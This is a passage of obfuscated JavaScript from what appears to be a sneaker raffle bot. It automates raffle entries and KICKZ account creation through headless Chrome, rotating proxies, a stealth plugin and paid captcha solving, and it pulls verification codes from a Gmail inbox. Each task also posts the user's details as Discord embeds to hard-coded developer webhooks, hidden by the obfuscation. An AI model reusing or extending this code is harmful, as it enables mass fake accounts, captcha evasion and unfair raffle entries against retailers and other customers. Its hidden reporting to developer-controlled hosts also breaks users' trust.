                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x508b2b[_0x5277f6]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x508b2b[_0x5277f6]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x1544fc
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x4a50c2['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x539abe
                            }
                        ]
                    }];
                    const _0x9711cd = { 'embeds': _0x3cc851 };
                    _0x5bbc27(_0x47ffd7['name'] + '\x20Task\x20' + (_0x5277f6 + 0x1) + '\x20/\x20' + _0x508b2b['length'] + '\x20||\x20File:\x20' + _0x3d6b41 + '\x20Proxies:\x20' + _0x4629ee);
                    try {
                        await _0x2dc03a(_0x508b2b, _0x5277f6);
                    } catch {
                        _0x331a22 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x2bb1f3 = await _0x530ba6(_0x508b2b[_0x5277f6], _0x47ffd7, 'dev', ![]), _0x4249a3 = await _0x530ba6(_0x508b2b[_0x5277f6], _0x47ffd7, 'pub', ![]);
                    const _0x585a40 = {
                        'succesDEVMSG': { 'embeds': [_0x2bb1f3] },
                        'succesPUBMSG': { 'embeds': [_0x4249a3] }
                    };
                    if (_0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '')
                        try {
                            await _0x313aa7(_0x4a50c2['webhook'], _0x585a40['succesDEVMSG']);
                        } catch {
                        }
                    await _0xb9a1a7(0xc8), await _0x313aa7(_0x495189, _0x585a40['succesDEVMSG']), await _0xb9a1a7(0xc8);
                    try {
                        await _0x313aa7(_0x40302c, _0x585a40['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x508b2b[_0x5277f6]['Email'] == '' || _0x508b2b[_0x5277f6]['Url'] == '' || _0x508b2b[_0x5277f6]['FirstName'] == '' || _0x508b2b[_0x5277f6]['LastName'] == '') {
                        console['log'](_0x5b6bc2() + '\x20[' + _0x2a4370[taskModule]['name'] + ']\x20Task\x20' + (_0x5277f6 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x4a50c2['useRandomProxy'] = ![])
                        var _0x29ff47 = _0x12a4af[_0x5277f6]['split'](':');
                    else
                        var _0x5c6eee = Math['round'](Math['random']() * (_0x12a4af['length'] - 0x1)), _0x29ff47 = _0x12a4af[_0x5c6eee]['split'](':');
                    var _0x289d26;
                    try {
                        _0x289d26 = await _0x14f2e1['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x29ff47[0x0] + ':' + _0x29ff47[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x289d26 = await _0x14f2e1['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x29ff47[0x0] + ':' + _0x29ff47[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x4ac425 = await _0x289d26['newPage']();
                        await _0x4ac425['authenticate']({
                            'username': '' + _0x29ff47[0x2],
                            'password': '' + _0x29ff47[0x3]
                        }), console['log'](_0x5b6bc2() + '\x20[' + _0x47ffd7['name'] + ']\x20Task\x20' + (_0x5277f6 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4ac425['setRequestInterception'](!![]), _0x4ac425['on']('request', _0x4059b3 => {
                            _0x4059b3['resourceType']() === 'image' || _0x4059b3['resourceType']() === 'font' || _0x4059b3['resourceType']() === 'media' ? _0x4059b3['abort']() : _0x4059b3['continue']();
                        });
                        try {
                            await _0x4ac425['goto']('' + _0x508b2b[_0x5277f6]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x4ac425['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x5b6bc2() + '\x20[' + _0x47ffd7['name'] + ']\x20Task\x20' + (_0x5277f6 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4ac425['type']('#comp_firstname', '' + _0x508b2b[_0x5277f6]['FirstName']), await _0x4ac425['waitForSelector']('#comp_lastname'), await _0x4ac425['type']('#comp_lastname', '' + _0x508b2b[_0x5277f6]['LastName']), await _0x4ac425['waitForSelector']('#comp_email'), await _0x4ac425['type']('#comp_email', '' + _0x508b2b[_0x5277f6]['Email']), await _0x4ac425['waitForSelector']('#comp_paypalemail'), await _0x4ac425['type']('#comp_paypalemail', '' + _0x508b2b[_0x5277f6]['Email']), await _0x4ac425['waitForSelector']('#comp_mobile_end'), await _0x4ac425['type']('#comp_mobile_end', '' + _0x508b2b[_0x5277f6]['Phone']), await _0x4ac425['waitForSelector']('#comp_dob'), await _0x4ac425['type']('#comp_dob', '08/09/1992'), console['log'](_0x5b6bc2() + '\x20[' + _0x47ffd7['name'] + ']\x20Task\x20' + (_0x5277f6 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x508b2b[_0x5277f6]['Size'] == 'RANDOM') {
                            const _0x4f953d = await _0x4ac425['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x1297b7 => {
                                return _0x1297b7['map'](_0x17e65d => _0x17e65d['value']);
                            });
                            var _0x45d976 = Math['round'](Math['random']() * (_0x4f953d['length'] - 0x2));
                            await _0x4ac425['select']('#shoesize', _0x4f953d[_0x45d976 + 0x1]), await _0xb9a1a7(0x3e8);
                        } else {
                            const _0x4e37a6 = await _0x4ac425['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x10245c => {
                                return _0x10245c['map'](_0x1d8c1a => _0x1d8c1a['innerText']);
                            }), _0x25e855 = await _0x4ac425['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x2e5705 => {
                                return _0x2e5705['map'](_0x46806c => _0x46806c['value']);
                            });
                            var _0x7ee75 = _0x508b2b[_0x5277f6]['Size'];
                            for (var _0x10be5f = 0x1; _0x10be5f < _0x25e855['length']; _0x10be5f++) {
                                var _0x291252 = _0x4e37a6[_0x10be5f]['split']('\x20')[0x0];
                                if (_0x291252 == _0x7ee75) {
                                    await _0x4ac425['select']('#shoesize', _0x25e855[_0x10be5f]);
                                    break;
                                } else {
                                    if (_0x10be5f + 0x1 == _0x25e855['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x4ac425['waitForSelector']('#comp_address1'), await _0x4ac425['type']('#comp_address1', _0x508b2b[_0x5277f6]['Address1'] + '\x20' + _0x508b2b[_0x5277f6]['HouseNumber']), await _0x4ac425['waitForSelector']('#comp_address2'), await _0x4ac425['type']('#comp_address2', '' + _0x508b2b[_0x5277f6]['Address2']), await _0x4ac425['waitForSelector']('#comp_address2'), await _0x4ac425['type']('#comp_address3', '' + _0x508b2b[_0x5277f6]['City']), await _0x4ac425['waitForSelector']('#comp_postcode'), await _0x4ac425['type']('#comp_postcode', '' + _0x508b2b[_0x5277f6]['Zip']), console['log'](_0x5b6bc2() + '\x20[' + _0x47ffd7['name'] + ']\x20Task\x20' + (_0x5277f6 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0xb9a1a7(0x4b0), await _0x4ac425['click']('label#emailhold'), await _0xb9a1a7(0x5dc), await _0x4ac425['click']('#preauth_tandc_email\x20>\x20label'), await _0xb9a1a7(0x5dc), await _0x4ac425['click']('#submit');
                        try {
                            await _0x4ac425['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x5b6bc2() + '\x20[' + _0x47ffd7['name'] + ']\x20Task\x20' + (_0x5277f6 + 0x1) + '\x20:\x20' + _0x5631d3['blue']('Awaiting\x20Paypal\x20Payment')), _0x289d26['on']('targetcreated', async _0x2710aa => {
                            if (_0x2710aa['type']() === 'page') {
                                const _0x256f4e = await _0x2710aa['page']();
                                async function _0x447fc6() {
                                    try {
                                        await _0x4ac425['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x4adabe = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x285be9() {
                                    try {
                                        await _0x4ac425['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x12f313 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x285be9(), _0x447fc6(), await _0xb9a1a7(0x493e0);
                            }
                        });
                        async function _0xa05efd() {
                            for (let _0x290cf3 = 0x0; _0x290cf3 < 0x12c; _0x290cf3++) {
                                if (_0x12f313 == !![]) {
                                    _0x331a22 = 'no', _0x5207fa(_0x508b2b[_0x5277f6], _0x47ffd7), console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0x47ffd7['name'] + ']\x20Task\x20' + (_0x5277f6 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '')
                                        try {
                                            await _0x313aa7(_0x4a50c2['webhook'], _0x585a40['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0xb9a1a7(0xc8), await _0x313aa7(_0x495189, _0x585a40['succesDEVMSG']), await _0xb9a1a7(0xc8);
                                    try {
                                        await _0x313aa7(_0x40302c, _0x585a40['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x4adabe)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0xb9a1a7(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0xb9a1a7(0xbb8), await _0x4ac425['click']('.zoid-outlet'), await _0xb9a1a7(0x7d0), await _0xa05efd();
                    } catch (_0x127178) {
                        console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x47ffd7['name'] + ']\x20Task\x20' + (_0x5277f6 + 0x1) + '\x20:\x20' + _0x127178)), _0x4a6669 = '' + _0x127178;
                        var _0x3af922 = await _0x530ba6(_0x508b2b[_0x5277f6], _0x47ffd7, 'dev', !![], _0x4a6669);
                        _0x585a40['errorDEV'] = { 'embeds': [_0x3af922] }, _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x585a40['errorDEV']), await _0x313aa7(_0x4190b7, _0x585a40['errorDEV']);
                    } finally {
                        _0x289d26 && _0x289d26['close']();
                        if (_0x331a22 == 'yes' && _0x4ab1d6 != 0x5 && _0x4a6669 != 'Size\x20Not\x20Found') {
                            console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x47ffd7['name'] + ']\x20Task\x20' + (_0x5277f6 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4ab1d6 + '\x20/\x205)')), _0x5277f6 = _0x5277f6 - 0x1, _0x4ab1d6 = _0x4ab1d6 + 0x1;
                            continue;
                        }
                        _0x331a22 == 'yes' && _0x4ab1d6 >= 0x5 && (_0x100e1d(afew[_0x5277f6], _0x47ffd7), _0x331a22 = 'no', _0x4ab1d6 = 0x0), console['log']('Waiting\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x2967c1, _0xa171ee, _0x271806) {
                    _0x14f2e1['use'](_0x3313a5()), _0x14f2e1['use'](_0x2255ea({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4a50c2['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x132ab0 = 0x0; _0x132ab0 < _0xa171ee['length']; _0x132ab0++) {
                        const _0x5ae532 = 'https://www.kickz.com/login';
                        if (_0x72fea6 != 'yes')
                            var _0x72fea6 = '', _0x22b216 = 0x0;
                        _0x5bbc27(_0x2967c1['name'] + '\x20Task\x20' + (_0x132ab0 + 0x1) + '\x20/\x20' + _0xa171ee['length'] + '\x20||\x20File:\x20' + _0x3d6b41 + '\x20Proxies:\x20' + _0x4629ee);
                        try {
                            await _0x2dc03a(_0xa171ee, _0x132ab0);
                        } catch {
                            _0x72fea6 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x2e1787 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1544fc
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4a50c2['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x539abe
                                }
                            ]
                        }];
                        const _0x252942 = { 'embeds': _0x2e1787 };
                        var _0x5d57d3 = await _0x530ba6(_0xa171ee[_0x132ab0], _0x2967c1, 'acc', ![]);
                        const _0x1bffc2 = { 'succesDEVMSG': { 'embeds': [_0x5d57d3] } };
                        if (_0xa171ee[_0x132ab0]['Email'] == '' || _0xa171ee[_0x132ab0]['FirstName'] == '' || _0xa171ee[_0x132ab0]['LastName'] == '') {
                            console['log'](_0x5b6bc2() + '\x20[' + _0x2967c1['name'] + ']\x20Task\x20' + (_0x132ab0 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0xa171ee[_0x132ab0]['Password'] == '' && (_0xa171ee[_0x132ab0]['Password'] = 'JRaffles23!');
                        if (_0x4a50c2['useRandomProxy'] = ![])
                            var _0x1fa651 = _0x271806[_0x132ab0]['split'](':');
                        else
                            var _0x147179 = Math['round'](Math['random']() * (_0x271806['length'] - 0x1)), _0x1fa651 = _0x271806[_0x147179]['split'](':');
                        var _0x354c65;
                        try {
                            _0x354c65 = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1fa651[0x0] + ':' + _0x1fa651[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x354c65 = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1fa651[0x0] + ':' + _0x1fa651[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x57a984 = await _0x354c65['newPage']();
                            await _0x57a984['authenticate']({
                                'username': '' + _0x1fa651[0x2],
                                'password': '' + _0x1fa651[0x3]
                            }), console['log'](_0x5b6bc2() + '\x20[' + _0x2967c1['name'] + ']\x20Task\x20' + (_0x132ab0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x57a984['setRequestInterception'](!![]), _0x57a984['on']('request', _0x21f45e => {
                                _0x21f45e['resourceType']() === 'image' || _0x21f45e['resourceType']() === 'font' || _0x21f45e['resourceType']() === 'media' ? _0x21f45e['abort']() : _0x21f45e['continue']();
                            }), await _0x57a984['goto'](_0x5ae532), await _0xb9a1a7(0xbb8), console['log'](_0x5b6bc2() + '\x20[' + _0x2967c1['name'] + ']\x20Task\x20' + (_0x132ab0 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x57a984['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x57a984['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x57a984['waitForSelector']('#button-register'), await _0xb9a1a7(0x7d0), await _0x57a984['evaluate'](() => {
                                const _0x247eac = document['querySelector']('#button-register');
                                _0x247eac['click']();
                            }), console['log'](_0x5b6bc2() + '\x20[' + _0x2967c1['name'] + ']\x20Task\x20' + (_0x132ab0 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0xb9a1a7(0x1388), await _0x57a984['waitForSelector']('#customer_salutation'), await _0x57a984['select']('#customer_salutation', 'mr'), await _0xb9a1a7(0x7d0), await _0x57a984['waitForSelector']('#customer_firstname'), await _0x57a984['type']('#customer_firstname', '' + _0xa171ee[_0x132ab0]['FirstName']), await _0xb9a1a7(0x352), await _0x57a984['waitForSelector']('#customer_lastname'), await _0x57a984['type']('#customer_lastname', '' + _0xa171ee[_0x132ab0]['LastName']), await _0xb9a1a7(0x352), await _0x57a984['type']('#email-input', '' + _0xa171ee[_0x132ab0]['Email']), await _0xb9a1a7(0x352), await _0x57a984['type']('#email-confirm-input', '' + _0xa171ee[_0x132ab0]['Email']), await _0xb9a1a7(0x352), await _0x57a984['type']('#register-password', '' + _0xa171ee[_0x132ab0]['Password']), await _0xb9a1a7(0x352), await _0x57a984['type']('#password-confirm', '' + _0xa171ee[_0x132ab0]['Password']), await _0xb9a1a7(0x352), console['log'](_0x5b6bc2() + '\x20[' + _0x2967c1['name'] + ']\x20Task\x20' + (_0x132ab0 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x57a984['click']('#consent'), await _0xb9a1a7(0x1f4);
                            const _0x17e8dd = await _0x57a984['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x17e8dd) {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x2967c1['name'] + ']\x20Task\x20' + (_0x132ab0 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x57a984['click']('#buttonRegister');
                            try {
                                await _0x57a984['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x5b6bc2() + '\x20[' + _0x2967c1['name'] + ']\x20Task\x20' + (_0x132ab0 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0xa171ee[_0x132ab0]['Email']), await _0xb9a1a7(0x4b0);
                            async function _0x4551bd() {
                                var _0x9425ce, _0x5efb51 = ![];
                                for (var _0x3e0c74 = 0x0; _0x3e0c74 < 0x18; _0x3e0c74++) {
                                    async function _0x4baabc() {
                                        var _0x423412 = new _0x373ca3({
                                            'user': _0x4a50c2['masterMail'],
                                            'password': _0x4a50c2['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x407234(_0xb6f270) {
                                            _0x423412['openBox']('INBOX', ![], _0xb6f270);
                                        }
                                        _0x423412['once']('ready', function () {
                                            console['log'](_0x5b6bc2() + '\x20[' + _0x2967c1['name'] + ']\x20Task\x20' + (_0x132ab0 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x407234(function (_0x17e2a7, _0x252360) {
                                                console['log'](_0x5b6bc2() + '\x20[' + _0x2967c1['name'] + ']\x20Task\x20' + (_0x132ab0 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x17e2a7)
                                                    throw _0x17e2a7;
                                                _0x423412['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x21cd9d, _0x58fe08) {
                                                    if (!_0x58fe08 || !_0x58fe08['length'])
                                                        console['log'](_0x5b6bc2() + '\x20[' + _0x2967c1['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x423412['end']();
                                                    else {
                                                        var _0x9aa610 = _0x423412['seq']['fetch'](_0x58fe08, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x9aa610['on']('message', function (_0x1c2ea1, _0x4ab92f) {
                                                            var _0x2379a2 = '(#' + _0x4ab92f + ')\x20';
                                                            _0x1c2ea1['on']('body', function (_0x1e76bb, _0x27b0a4) {
                                                                _0x489d8f(_0x1e76bb, (_0x518ce0, _0x13d212) => {
                                                                    if (_0x13d212['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x18e411 = _0x13d212['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x2466a0 = _0x18e411[0x1]['split']('<')[0x0];
                                                                        _0x9425ce = _0x2466a0;
                                                                    }
                                                                });
                                                            }), _0x1c2ea1['once']('end', function () {
                                                            });
                                                        }), _0x9aa610['once']('error', function (_0x4a1dd2) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x9aa610['once']('end', function () {
                                                            _0x423412['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x423412['once']('error', function (_0x980209) {
                                            console['log'](_0x5631d3['red'](_0x980209['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x5efb51 = !![];
                                        }), _0x423412['once']('end', async function () {
                                        }), _0x423412['connect']();
                                    }
                                    _0x4baabc(), await _0xb9a1a7(0x1388);
                                    if (_0x9425ce)
                                        return _0x9425ce;
                                    if (_0x5efb51)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x3e0c74 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x4551bd(), _0xb9a1a7(0x320), console['log'](_0x5b6bc2() + '\x20[' + _0x2967c1['name'] + ']\x20Task\x20' + (_0x132ab0 + 0x1) + '\x20:\x20Verifying..'), await _0x57a984['type']('#verificationCode', code), await _0xb9a1a7(0x1f4), await _0x57a984['click']('#buttonVerify'), await _0xb9a1a7(0x190), await _0x57a984['click']('#buttonVerify'), await _0xb9a1a7(0x3e8);
                            try {
                                await _0x57a984['waitForSelector']('div.b-user_greeting'), _0x72fea6 = 'no', console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0x2967c1['name'] + ']\x20Task\x20' + (_0x132ab0 + 0x1) + '\x20:\x20Account\x20' + _0xa171ee[_0x132ab0]['Email'] + '\x20Generated\x20&\x20Verified!')), _0xf38118['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0xa171ee[_0x132ab0]['Email'] + ',' + _0xa171ee[_0x132ab0]['Password'] + ','), console['log'](_0x5b6bc2() + '\x20[' + _0x2967c1['name'] + ']\x20Task\x20' + (_0x132ab0 + 0x1) + '\x20:\x20Account\x20' + _0xa171ee[_0x132ab0]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x1bffc2['succesDEVMSG']);
                                } catch {
                                }
                                await _0x313aa7(_0x54bd15, _0x1bffc2['succesDEVMSG']);
                            } catch {
                                _0x72fea6 = 'no', console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x2967c1['name'] + ']\x20Task\x20' + (_0x132ab0 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x2967c1['name'] + ']\x20Task\x20' + (_0x132ab0 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x4631d3) {
                            console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x2967c1['name'] + ']\x20Task\x20' + (_0x132ab0 + 0x1) + '\x20:\x20' + _0x4631d3)), _0x2e1787[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x2e1787[0x0]['description'] = '' + _0x4631d3, await _0x313aa7(_0x4190b7, _0x252942), _0x72fea6 = 'yes';
                        } finally {
                            _0x354c65 && _0x354c65['close']();
                            if (_0x72fea6 == 'yes' && _0x22b216 != 0x5) {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x2967c1['name'] + ']\x20Task\x20' + (_0x132ab0 + 0x1) + '\x20:\x20Retrying\x20(' + _0x22b216 + '\x20/\x205)')), _0x132ab0 = _0x132ab0 - 0x1, _0x22b216 = _0x22b216 + 0x1;
                                continue;
                            }
                            _0x72fea6 == 'yes' && _0x22b216 >= 0x5 && (_0x100e1d(_0xa171ee[_0x132ab0], _0x2967c1), _0x72fea6 = 'no', _0x22b216 = 0x0), console['log']('Waiting\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x159192, _0x1f1c33, _0x21b96e) {
                    _0x14f2e1['use'](_0x3313a5()), _0x14f2e1['use'](_0x2255ea({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4a50c2['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4cfbb9 = 0x0; _0x4cfbb9 < _0x1f1c33['length']; _0x4cfbb9++) {
                        var _0x2c0275;
                        if (_0x442d0f != 'yes')
                            var _0x442d0f = '', _0x56de01 = 0x0;
                        _0x5bbc27(_0x159192['name'] + '\x20Task\x20' + (_0x4cfbb9 + 0x1) + '\x20/\x20' + _0x1f1c33['length'] + '\x20||\x20File:\x20' + _0x3d6b41 + '\x20Proxies:\x20' + _0x4629ee);
                        var _0x30229c = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1544fc
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x1f1c33[_0x4cfbb9]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x1f1c33[_0x4cfbb9]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4a50c2['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x539abe
                                }
                            ]
                        }];
                        let _0x3607d3 = [
                            'Email',
                            'Password',
                            'FirstName',
                            'LastName',
                            'Size',
                            'Address1',
                            'HouseNumber',
                            'Zip',
                            'Country',
                            'City'
                        ], _0x4bde00 = ![];
                        for (key of _0x3607d3) {
                            if (_0x1f1c33[_0x4cfbb9][key] == '' || !_0x1f1c33[_0x4cfbb9][key]) {
                                console['log'](_0x5b6bc2() + '\x20[' + _0x159192['name'] + ']\x20Task\x20' + (_0x4cfbb9 + 0x1) + '\x20:\x20Invalid\x20CSV,\x20' + key + '\x20not\x20found'), _0x4bde00 = !![];
                                break;
                            }
                        }
                        if (_0x4bde00) {
                            await _0xb9a1a7(0x1f4);
                            continue;
                        }
                        var _0x3780ad = await _0x530ba6(_0x1f1c33[_0x4cfbb9], _0x159192, 'dev', ![]), _0x1d24de = await _0x530ba6(_0x1f1c33[_0x4cfbb9], _0x159192, 'pub', ![]);
                        const _0x29821c = {
                            'succesDEVMSG': { 'embeds': [_0x3780ad] },
                            'succesPUBMSG': { 'embeds': [_0x1d24de] }
                        };
                        try {
                            await _0x2dc03a(_0x1f1c33, _0x4cfbb9);
                        } catch {
                            _0x442d0f = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x4a50c2['useRandomProxy'] = ![])
                            var _0x3045a4 = _0x21b96e[_0x4cfbb9]['split'](':');
                        else
                            var _0x6d4a13 = Math['round'](Math['random']() * (_0x21b96e['length'] - 0x1)), _0x3045a4 = _0x21b96e[_0x6d4a13]['split'](':');
                        var _0x2aa366;
                        try {
                            _0x2aa366 = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x3045a4[0x0] + ':' + _0x3045a4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2aa366 = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x3045a4[0x0] + ':' + _0x3045a4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x29a5ba = await _0x2aa366['newPage']();
                            await _0x29a5ba['authenticate']({
                                'username': '' + _0x3045a4[0x2],
